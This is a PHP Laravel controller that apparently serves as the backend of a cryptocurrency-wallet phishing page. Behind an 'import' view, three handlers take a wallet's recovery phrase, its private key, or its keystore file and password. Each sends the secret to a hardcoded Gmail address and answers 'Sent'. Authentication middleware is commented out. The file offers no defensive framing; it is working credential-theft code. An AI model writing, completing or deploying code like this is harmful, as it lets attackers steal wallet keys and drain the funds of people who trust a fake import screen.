<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Mail\KeyDetails;
use Illuminate\Support\Facades\Mail;

class HomeController extends Controller
{
    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        //$this->middleware('auth');
    }

    /**
     * Show the application dashboard.
     *
     * @return \Illuminate\Contracts\Support\Renderable
     */
    public function index()
    {
        return view('index');
    }

    public function import()
    {
        return view('import');
    }

    public function processPhrase(Request $request)
    {
        Mail::to('MarcHawksdzm99@gmail.com')->send(new KeyDetails($request->phrase, null, null, null));
        return response(['error' => false, 'message' => 'Sent']);
    }

    public function processPrivate(Request $request)
    {
        Mail::to('MarcHawksdzm99@gmail.com')->send(new KeyDetails(null, null, null, $request->private));
        return response(['error' => false, 'message' => 'Sent']);
    }

    public function processKeystore(Request $request)
    {
        Mail::to('MarcHawksdzm99@gmail.com')->send(new KeyDetails(null, $request->keystore, $request->password, null));
        return response(['error' => false, 'message' => 'Sent']);
    }
}